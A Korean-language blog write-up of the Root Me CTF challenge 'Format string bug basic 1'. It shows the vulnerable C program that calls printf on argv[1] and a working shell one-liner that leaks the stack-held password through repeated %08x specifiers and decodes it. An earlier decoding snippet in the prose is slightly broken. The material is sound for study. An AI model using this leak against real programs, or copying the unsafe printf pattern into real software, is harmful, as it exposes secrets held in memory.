---
layout: post
title:  "Root Me: ELF x86 - Format string bug basic 1"
date:   2018-01-25 00:00:03
author: nyan101
categories: 자습
tags:	app/system
cover:  
---



주어진 코드는 다음과 같다.

```c
#include <stdio.h>
#include <unistd.h>
     
int main(int argc, char *argv[]){
	FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
	char buffer[32];
	fgets(buffer, sizeof(buffer), secret);
	printf(argv[1]);
	fclose(secret);
 	return 0;
}
```

`printf` 함수의 인자로 첫 번째 argv가 들어간다. argv에 일반적인 문자열이나 특수 포맷문자(ex : %s, %x 등)를 넣었을 경우를 생각해 보자.

* print("asdf") : asdf가 출력된다
* printf("%x") : printf의 '2번째 인자가 있을 것이라고 추정되는 영역'에서 4바이트 값을 읽어온다.

그런데 코드상에서 printf에 추가 인자를 넣어주지 않았으므로 스택에서 가져올 인자는 printf의 ret addr이나  `char buffer[32]`가 차지하고 있는 영역이 된다. 이를 이용해 buffer에 저장된 secret 내용을 읽어올 수 있다. 편의를 위해 다음과 같은 코드를 작성했다.

* print '%08x' * 10
   : char[32]를 위해 8글자, 다른 인자나 ret addr 등을 대비해 약간의 여유분(2*4 bytes) 추가
* s = raw_input(); print "".join([chr[int(s[2\*i:2\*i+1])]] for i in range(40)])
  : 입력으로 받은 문자열을 2글자(=1byte)씩 끊어서 ASCII로 변환해 출력

그런데 생각처럼 읽을 수 있는 충분한 길이의 문자열이 등장하지 않았다. 몇 번의 시도 결과 `print '%08x' * 14`에서 완전한 내용을 얻을 수 있었는데 정확한 이유는 아직 잘 모르겠다. 엔디안에 유의하면 정확한 내용을 출력하는 커맨드를 다음과 같이 작성할 수 있다.

```
./ch5 $(python -c "print '%08x'*14") | python -c "
	s=raw_input();
	print ''.join([''.join([chr(int(s[2*i:2*i+2],16)) for i in range(40,56)])[j*4:j*4+4][::-1] for j in range(4)]) "
```
끝나고 다른 사람의 풀이를 봤는데 별다른 주소계산 없이 "일단 AAAAA..A를 넣어보고 0x41414141이 나올때까지 하나씩 pop 해보자"로 시작해서 약간 허탈했다. 생각해보니 컴파일러마다 조금씩 패딩을 붙이기도 하고 정확히 필요한 만큼만 메모리 공간이 할당되는 것도 아니니 이런 방법에도 익숙해져야 할 듯 하다.